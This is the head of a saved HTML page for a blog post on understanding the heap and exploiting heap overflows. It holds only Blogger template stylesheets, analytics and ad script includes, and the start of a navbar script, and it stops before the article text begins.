<!DOCTYPE html>
<!-- saved from url=(0075)http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html -->
<html class="v2" dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="IE=8" http-equiv="X-UA-Compatible">
<meta content="width=1100" name="viewport">

<meta content="blogger" name="generator">
<link href="http://www.mathyvanhoef.com/favicon.ico" rel="icon" type="image/x-icon">
<link href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="Mathy Vanhoef - Atom" href="http://www.mathyvanhoef.com/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="Mathy Vanhoef - RSS" href="http://www.mathyvanhoef.com/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="Mathy Vanhoef - Atom" href="https://www.blogger.com/feeds/3500917063499850097/posts/default">
<link rel="alternate" type="application/atom+xml" title="Mathy Vanhoef - Atom" href="http://www.mathyvanhoef.com/feeds/1709971016142527507/comments/default">
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1803938243-ieretrofit.js"></script>
<![endif]-->
<link href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/linkedlist_small.png" rel="image_src">
<meta content="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html" property="og:url">
<meta content="http://4.bp.blogspot.com/-5YeGAw-FLMM/UPvsS5PBRiI/AAAAAAAAAPc/avsu-WhaVEk/w1200-h630-p-nu/linkedlist_small.png" property="og:image">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>Mathy Vanhoef: Understanding the Heap &amp; Exploiting Heap Overflows</title>
<link type="text/css" rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/2340730481-css_bundle_v2.css">
<link type="text/css" rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/authorization.css">
<style id="page-skin-1" type="text/css"><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Awesome Inc.
Designer: Tina Chen
URL:      tinachen.org
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#ffffff"/>
<Group description="Page" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.background.color" description="Background Color" type="color" default="#000000"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Links" selector=".main-inner">
<Variable name="link.color" description="Link Color" type="color" default="#888888"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#444444"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#cccccc"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Title Font" type="font"
default="normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Title Color" type="color" default="#444444" />
<Variable name="header.background.color" description="Header Background" type="color" default="transparent" />
</Group>
<Group description="Blog Description" selector=".header .description">
<Variable name="description.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="description.text.color" description="Text Color" type="color"
default="#444444" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#444444"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#444444"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="#444444"/>
<Variable name="tabs.border.color" description="Border Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Date Header" selector=".main-inner .widget h2.date-header, .main-inner .widget h2.date-header span">
<Variable name="date.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="date.text.color" description="Text Color" type="color" default="#666666"/>
<Variable name="date.border.color" description="Border Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Post Title" selector="h3.post-title, h4, h3.post-title a">
<Variable name="post.title.font" description="Font" type="font"
default="normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="post.title.text.color" description="Text Color" type="color" default="#444444"/>
</Group>
<Group description="Post Background" selector=".post">
<Variable name="post.background.color" description="Background Color" type="color" default="#ffffff" />
<Variable name="post.border.color" description="Border Color" type="color" default="#eeeeee" />
<Variable name="post.border.bevel.color" description="Bevel Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Gadget Title" selector="h2">
<Variable name="widget.title.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Text Color" type="color" default="#444444"/>
</Group>
<Group description="Gadget Text" selector=".sidebar .widget">
<Variable name="widget.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.text.color" description="Text Color" type="color" default="#444444"/>
<Variable name="widget.alternate.text.color" description="Alternate Color" type="color" default="#666666"/>
</Group>
<Group description="Gadget Links" selector=".sidebar .widget">
<Variable name="widget.link.color" description="Link Color" type="color" default="#3778cd"/>
<Variable name="widget.link.visited.color" description="Visited Color" type="color" default="#4d469c"/>
<Variable name="widget.link.hover.color" description="Hover Color" type="color" default="#3778cd"/>
</Group>
<Group description="Gadget Background" selector=".sidebar .widget">
<Variable name="widget.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="widget.border.color" description="Border Color" type="color" default="#222222"/>
<Variable name="widget.border.bevel.color" description="Bevel Color" type="color" default="#000000"/>
</Group>
<Group description="Sidebar Background" selector=".column-left-inner .column-right-inner">
<Variable name="widget.outer.background.color" description="Background Color" type="color" default="transparent" />
</Group>
<Group description="Images" selector=".main-inner">
<Variable name="image.background.color" description="Background Color" type="color" default="transparent"/>
<Variable name="image.border.color" description="Border Color" type="color" default="transparent"/>
</Group>
<Group description="Feed" selector=".blog-feeds">
<Variable name="feed.text.color" description="Text Color" type="color" default="#444444"/>
</Group>
<Group description="Feed Links" selector=".blog-feeds">
<Variable name="feed.link.color" description="Link Color" type="color" default="#3778cd"/>
<Variable name="feed.link.visited.color" description="Visited Color" type="color" default="#4d469c"/>
<Variable name="feed.link.hover.color" description="Hover Color" type="color" default="#3778cd"/>
</Group>
<Group description="Pager" selector=".blog-pager">
<Variable name="pager.background.color" description="Background Color" type="color" default="#ffffff" />
</Group>
<Group description="Footer" selector=".footer-outer">
<Variable name="footer.background.color" description="Background Color" type="color" default="#ffffff" />
<Variable name="footer.text.color" description="Text Color" type="color" default="#444444" />
</Group>
<Variable name="title.shadow.spread" description="Title Shadow" type="length" default="-1px"/>
<Variable name="body.background" description="Body Background" type="background"
color="#eeeeee"
default="$(color) none repeat scroll top left"/>
<Variable name="body.background.gradient.cap" description="Body Gradient Cap" type="url"
default="none"/>
<Variable name="body.background.size" description="Body Background Size" type="string" default="auto"/>
<Variable name="tabs.background.gradient" description="Tabs Background Gradient" type="url"
default="none"/>
<Variable name="header.background.gradient" description="Header Background Gradient" type="url" default="none" />
<Variable name="header.padding.top" description="Header Top Padding" type="length" default="22px" />
<Variable name="header.margin.top" description="Header Top Margin" type="length" default="0" />
<Variable name="header.margin.bottom" description="Header Bottom Margin" type="length" default="0" />
<Variable name="widget.padding.top" description="Widget Padding Top" type="length" default="8px" />
<Variable name="widget.padding.side" description="Widget Padding Side" type="length" default="15px" />
<Variable name="widget.outer.margin.top" description="Widget Top Margin" type="length" default="0" />
<Variable name="widget.outer.background.gradient" description="Gradient" type="url" default="none" />
<Variable name="widget.border.radius" description="Gadget Border Radius" type="length" default="0" />
<Variable name="outer.shadow.spread" description="Outer Shadow Size" type="length" default="0" />
<Variable name="date.header.border.radius.top" description="Date Header Border Radius Top" type="length" default="0" />
<Variable name="date.header.position" description="Date Header Position" type="length" default="15px" />
<Variable name="date.space" description="Date Space" type="length" default="30px" />
<Variable name="date.position" description="Date Float" type="string" default="static" />
<Variable name="date.padding.bottom" description="Date Padding Bottom" type="length" default="0" />
<Variable name="date.border.size" description="Date Border Size" type="length" default="0" />
<Variable name="date.background" description="Date Background" type="background" color="transparent"
default="$(color) none no-repeat scroll top left" />
<Variable name="date.first.border.radius.top" description="Date First top radius" type="length" default="0" />
<Variable name="date.last.space.bottom" description="Date Last Space Bottom" type="length"
default="20px" />
<Variable name="date.last.border.radius.bottom" description="Date Last bottom radius" type="length" default="0" />
<Variable name="post.first.padding.top" description="First Post Padding Top" type="length" default="0" />
<Variable name="image.shadow.spread" description="Image Shadow Size" type="length" default="0"/>
<Variable name="image.border.radius" description="Image Border Radius" type="length" default="0"/>
<Variable name="separator.outdent" description="Separator Outdent" type="length" default="15px" />
<Variable name="title.separator.border.size" description="Widget Title Border Size" type="length" default="1px" />
<Variable name="list.separator.border.size" description="List Separator Border Size" type="length" default="1px" />
<Variable name="shadow.spread" description="Shadow Size" type="length" default="0"/>
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
<Variable name="date.side" description="Side where date header is placed" type="string" default="right"/>
<Variable name="pager.border.radius.top" description="Pager Border Top Radius" type="length" default="0" />
<Variable name="pager.space.top" description="Pager Top Space" type="length" default="1em" />
<Variable name="footer.background.gradient" description="Background Gradient" type="url" default="none" />
<Variable name="mobile.background.size" description="Mobile Background Size" type="string"
default="auto"/>
<Variable name="mobile.background.overlay" description="Mobile Background Overlay" type="string"
default="transparent none repeat scroll top left"/>
<Variable name="mobile.button.color" description="Mobile Button Color" type="color" default="#ffffff" />
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
background: #eeeeee url(http://themes.googleusercontent.com/image?id=0BwVBOzw_-hbMNjViMzQ0ZDEtMWU1NS00ZTBkLWFjY2EtZjM5YmU4OTA2MjBm) repeat-x fixed top center /* Credit: Jason Morrow (http://jasonmorrow.etsy.com) */;
}
html body .content-outer {
min-width: 0;
max-width: 100%;
width: 100%;
}
a:link {
text-decoration: none;
color: #3778cd;
}
a:visited {
text-decoration: none;
color: #4d469c;
}
a:hover {
text-decoration: underline;
color: #3778cd;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 276px;
width: 100%;
background: transparent none repeat-x scroll top left;
_background-image: none;
}
/* Columns
----------------------------------------------- */
.content-inner {
padding: 0;
}
.header-inner .section {
margin: 0 16px;
}
.tabs-inner .section {
margin: 0 16px;
}
.main-inner {
padding-top: 30px;
}
.main-inner .column-center-inner,
.main-inner .column-left-inner,
.main-inner .column-right-inner {
padding: 0 5px;
}
*+html body .main-inner .column-center-inner {
margin-top: -30px;
}
#layout .main-inner .column-center-inner {
margin-top: 0;
}
/* Header
----------------------------------------------- */
.header-outer {
margin: 0 0 0 0;
background: transparent none repeat scroll 0 0;
}
.Header h1 {
font: normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
text-shadow: 0 0 -1px #000000;
}
.Header h1 a {
color: #444444;
}
.Header .description {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 0;
padding-right: 0;
margin-bottom: 0;
}
.header-inner .Header .titlewrapper {
padding-top: 22px;
}
/* Tabs
----------------------------------------------- */
.tabs-outer {
overflow: hidden;
position: relative;
background: #eeeeee url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
}
#layout .tabs-outer {
overflow: visible;
}
.tabs-cap-top, .tabs-cap-bottom {
position: absolute;
width: 100%;
border-top: 1px solid #999999;
}
.tabs-cap-bottom {
bottom: 0;
}
.tabs-inner .widget li a {
display: inline-block;
margin: 0;
padding: .6em 1.5em;
font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
border-left: 1px solid #999999;
}
.tabs-inner .widget li:last-child a {
border-right: 1px solid #999999;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
background: #666666 url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat-x scroll 0 -100px;
color: #ffffff;
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
}
/* Widgets
----------------------------------------------- */
.main-inner .section {
margin: 0 27px;
padding: 0;
}
.main-inner .column-left-outer,
.main-inner .column-right-outer {
margin-top: 0;
}
#layout .main-inner .column-left-outer,
#layout .main-inner .column-right-outer {
margin-top: 0;
}
.main-inner .column-left-inner,
.main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
#layout .main-inner .column-left-inner,
#layout .main-inner .column-right-inner {
margin-top: 0;
}
.sidebar .widget {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
}
.sidebar .widget a:link {
color: #3778cd;
}
.sidebar .widget a:visited {
color: #4d469c;
}
.sidebar .widget a:hover {
color: #3778cd;
}
.sidebar .widget h2 {
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget {
background-color: #ffffff;
border: 1px solid #eeeeee;
padding: 0 15px 15px;
margin: 20px -16px;
}
.main-inner .widget h2 {
margin: 0 -15px;
padding: .6em 15px .5em;
border-bottom: 1px solid transparent;
}
.footer-inner .widget h2 {
padding: 0 0 .4em;
border-bottom: 1px solid transparent;
}
.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
border-top: 1px solid #eeeeee;
padding-top: 8px;
}
.main-inner .widget .widget-content {
margin: 0 -15px;
padding: 7px 15px 0;
}
.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
margin: -8px -15px 0;
padding: 0;
list-style: none;
}
.main-inner .widget #ArchiveList {
margin: -8px 0 0;
}
.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
padding: .5em 15px;
text-indent: 0;
color: #666666;
border-top: 1px solid #eeeeee;
border-bottom: 1px solid transparent;
}
.main-inner .widget #ArchiveList ul li {
padding-top: .25em;
padding-bottom: .25em;
}
.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.main-inner .widget .post-body ul {
padding: 0 2.5em;
margin: .5em 0;
list-style: disc;
}
.main-inner .widget .post-body ul li {
padding: 0.25em 0;
margin-bottom: .25em;
color: #444444;
border: none;
}
.footer-inner .widget ul {
padding: 0;
list-style: none;
}
.widget .zippy {
color: #666666;
}
/* Posts
----------------------------------------------- */
body .main-inner .Blog {
padding: 0;
margin-bottom: 1em;
background-color: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
box-shadow: 0 0 0 rgba(0, 0, 0, 0);
}
.main-inner .section:last-child .Blog:last-child {
padding: 0;
margin-bottom: 1em;
}
.main-inner .widget h2.date-header {
margin: 0 -15px 1px;
padding: 0 0 0 0;
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
background: transparent none no-repeat scroll top left;
border-top: 0 solid #eeeeee;
border-bottom: 1px solid transparent;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
position: static;
bottom: 100%;
right: 15px;
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget h2.date-header span {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
display: block;
padding: .5em 15px;
border-left: 0 solid #eeeeee;
border-right: 0 solid #eeeeee;
}
.date-outer {
position: relative;
margin: 30px 0 20px;
padding: 0 15px;
background-color: #ffffff;
border: 1px solid #eeeeee;
}
.date-outer:first-child {
margin-top: 0;
}
.date-outer:last-child {
margin-bottom: 20px;
-moz-border-radius-bottomleft: 0;
-moz-border-radius-bottomright: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-bottom-left-radius: 0;
-goog-ms-border-bottom-right-radius: 0;
border-bottom-left-radius: 0;
border-bottom-right-radius: 0;
}
.date-posts {
margin: 0 -15px;
padding: 0 15px;
clear: both;
}
.post-outer, .inline-ad {
border-top: 1px solid #eeeeee;
margin: 0 -15px;
padding: 15px 15px;
}
.post-outer {
padding-bottom: 10px;
}
.post-outer:first-child {
padding-top: 0;
border-top: none;
}
.post-outer:last-child, .inline-ad:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.post-body img {
padding: 8px;
background: transparent;
border: 1px solid transparent;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
border-radius: 0;
}
h3.post-title, h4 {
font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
}
h3.post-title a {
font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #444444;
}
h3.post-title a:hover {
color: #3778cd;
text-decoration: underline;
}
.post-header {
margin: 0 0 1em;
}
.post-body {
line-height: 1.4;
}
.post-outer h2 {
color: #444444;
}
.post-footer {
margin: 1.5em 0 0;
}
#blog-pager {
padding: 15px;
font-size: 120%;
background-color: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius-topright: 0;
margin-top: 1em;
}
.blog-feeds, .post-feeds {
margin: 1em 0;
text-align: center;
color: #444444;
}
.blog-feeds a, .post-feeds a {
color: #3778cd;
}
.blog-feeds a:visited, .post-feeds a:visited {
color: #4d469c;
}
.blog-feeds a:hover, .post-feeds a:hover {
color: #3778cd;
}
.post-outer .comments {
margin-top: 2em;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
}
.comments .continue {
border-top: 2px solid #999999;
}
/* Footer
----------------------------------------------- */
.footer-outer {
margin: -20px 0 -1px;
padding: 20px 0 0;
color: #444444;
overflow: hidden;
}
.footer-fauxborder-left {
border-top: 1px solid #eeeeee;
background: #ffffff none repeat scroll 0 0;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
margin: 0 -20px;
}
/* Mobile
----------------------------------------------- */
body.mobile {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
*+html body.mobile .main-inner .column-center-inner {
margin-top: 0;
}
.mobile .main-inner .widget {
padding: 0 0 15px;
}
.mobile .main-inner .widget h2 + div,
.mobile .footer-inner .widget h2 + div {
border-top: none;
padding-top: 0;
}
.mobile .footer-inner .widget h2 {
padding: 0.5em 0;
border-bottom: none;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile .main-inner .widget ul,
.mobile .main-inner .widget #ArchiveList ul.flat {
margin: 0 -15px 0;
}
.mobile .main-inner .widget h2.date-header {
right: 0;
}
.mobile .date-header span {
padding: 0.4em 0;
}
.mobile .date-outer:first-child {
margin-bottom: 0;
border: 1px solid #eeeeee;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
}
.mobile .date-outer {
border-color: #eeeeee;
border-width: 0 1px 1px;
}
.mobile .date-outer:last-child {
margin-bottom: 0;
}
.mobile .main-inner {
padding: 0;
}
.mobile .header-inner .section {
margin: 0;
}
.mobile .blog-posts {
padding: 0 10px;
}
.mobile .post-outer, .mobile .inline-ad {
padding: 5px 0;
}
.mobile .tabs-inner .section {
margin: 0 10px;
}
.mobile .main-inner .widget h2 {
margin: 0;
padding: 0;
}
.mobile .main-inner .widget h2.date-header span {
padding: 0;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile #blog-pager {
border: 1px solid transparent;
background: #ffffff none repeat scroll 0 0;
}
.mobile .main-inner .column-left-inner,
.mobile .main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: none;
-webkit-box-shadow: none;
-goog-ms-box-shadow: none;
box-shadow: none;
}
.mobile .date-posts {
margin: 0;
padding: 0;
}
.mobile .footer-fauxborder-left {
margin: 0;
border-top: inherit;
}
.mobile .main-inner .section:last-child .Blog:last-child {
margin-bottom: 0;
}
.mobile-index-contents {
color: #444444;
}
.mobile .mobile-link-button {
background: #3778cd url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .PageList .widget-content {
background: transparent;
border-top: 1px solid;
border-color: #999999;
color: #444444;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #999999;
}

--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 930px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 930px;
max-width: 930px;
_width: 930px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 260px;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 260px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("260px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 260px;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 260px;
margin-right: -260px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
--></style>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/cb=gapi.loaded_2" async=""></script><script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js"></script><script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/cb=gapi.loaded_1" async=""></script><script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/cb=gapi.loaded_0" async=""></script><script type="text/javascript">function a(){var b=window.location.href,c=b.split("?");switch(c.length){case 1:return b+"?m=1";case 2:return 0<=c[1].search("(^|&)m=")?null:b+"&m=1";default:return null}}var d=navigator.userAgent;if(-1!=d.indexOf("Mobile")&&-1!=d.indexOf("WebKit")&&-1==d.indexOf("iPad")||-1!=d.indexOf("Opera Mini")||-1!=d.indexOf("IEMobile")){var e=a();e&&window.location.replace(e)};
</script><script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/js/google_top_exp.js"></script><style>.gc-bubbleDefault{background-color:transparent !important;text-align:left;padding:0 !important;margin:0 !important;border:0 !important;table-layout:auto !important}.gc-reset{background-color:transparent !important;border:0 !important;padding:0 !important;margin:0 !important;text-align:left}.pls-bubbleTop{border-bottom:1px solid #ccc !important}.pls-topTail,.pls-vertShimLeft,.pls-contentLeft{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/border_3.gif) !important}.pls-topTail{background-repeat:repeat-x !important;background-position:bottom !important}.pls-vertShim{background-color:#fff !important;text-align:right}.tbl-grey .pls-vertShim{background-color:#f5f5f5 !important}.pls-vertShimLeft{background-repeat:repeat-y !important;background-position:right !important;height:4px}.pls-vertShimRight{height:4px}.pls-confirm-container .pls-vertShim{background-color:#fff3c2 !important}.pls-contentWrap{background-color:#fff !important;position:relative !important;vertical-align:top}.pls-contentLeft{background-repeat:repeat-y;background-position:right;vertical-align:top}.pls-dropRight{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropR_3.png) !important;background-repeat:repeat-y !important;vertical-align:top}.pls-vert,.pls-tailleft,.pls-dropTR .pls-dropBR,.pls-dropBL,.pls-vert img{vertical-align:top}.pls-dropBottom{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropB_3.png) !important;background-repeat:repeat-x !important;width:100%;vertical-align:top}.pls-topLeft{background:inherit !important;text-align:right;vertical-align:bottom}.pls-topRight{background:inherit !important;text-align:left;vertical-align:bottom}.pls-bottomLeft{background:inherit !important;text-align:right}.pls-bottomRight{background:inherit !important;text-align:left;vertical-align:top}.pls-tailtop,.pls-tailright,.pls-tailbottom,.pls-tailleft{display:none;position:relative}.pls-tailbottom,.pls-tailtop,.pls-tailright,.pls-tailleft,.pls-dropTR,.pls-dropBR,.pls-dropBL{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite_3.png) !important;background-repeat:no-repeat}.tbl-grey .pls-tailbottom,.tbl-grey .pls-tailtop,.tbl-grey .pls-tailright,.tbl-grey .pls-tailleft,.tbl-grey .pls-dropTR,.tbl-grey .pls-dropBR,.tbl-grey .pls-dropBL{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite-grey.png) !important}.pls-tailbottom{background-position:-23px 0}.pls-confirm-container .pls-tailbottom{background-position:-23px -10px}.pls-tailtop{background-position:-19px -20px}.pls-tailright{background-position:0 0}.pls-tailleft{background-position:-10px 0}.pls-tailtop{vertical-align:top}.gc-bubbleDefault td{line-height:0;font-size:0}.pls-topLeft img,.pls-topRight img,.pls-tailbottom{vertical-align:bottom}.pls-bottomLeft img,.bubbleDropTR,.pls-dropBottomL img,.pls-dropBottom img,.pls-dropBottomR img,.pls-bottomLeft{vertical-align:top}.pls-dropTR{background-position:0 -22px}.pls-dropBR{background-position:0 -27px}.pls-dropBL{background-position:0 -16px}.pls-spacertop,.pls-spacerright,.pls-spacerbottom,.pls-spacerleft{position:static !important}.pls-spinner{bottom:0;position:absolute;left:0;margin:auto;right:0;top:0} </style><style type="text/css">
:root #header + #content > #left > #rlblock_left,
:root .inline-ad,
:root .AdSense,
:root #AdSense1
{ display: none !important; }</style></head>
<body class="">
<div class="navbar section" id="navbar"><div class="widget Navbar" data-version="1" id="Navbar1"><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
